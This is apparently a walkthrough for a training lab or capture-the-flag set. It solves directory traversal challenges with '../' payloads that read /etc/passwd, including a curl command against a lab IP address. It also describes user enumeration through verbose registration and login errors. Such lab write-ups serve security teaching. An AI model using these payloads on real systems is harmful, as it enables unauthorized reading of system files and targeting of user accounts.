# Directory Traversal
#### Grab Something Interesting - Challenge 1
Inspect the HTML source page, and in `report=` parameter, append the payload `../../../../../../../../../etc/passwd`
#### Grab Something Interesting II - Challenge 2
Inspect the HTML source page again, then append the payload `i=images/../../../../../../../../../../../etc/passwd` this will return an error that the image can't be displayed. Run this in your terminal
```
curl http://192.168.52.128/java/directorytraversal002/imagehelper?i=images/../../../../../../../../etc/passwd
```

# User Enumeration

#### User Enumeration Part 1 - Challenge 1
When logging in, an invalid username or password will only tell that it's **Invalid Username or Password**. But, if you go to the registration form, and register the same username twice, a verbose error will tell that the **username already exists**.

#### User Enumeration Part 2 - Challenge 2
This part exists both in registration form, login form will say **Password is incorrect**, this signify that the username is correct and existing. For the registration, the same as challenge 1.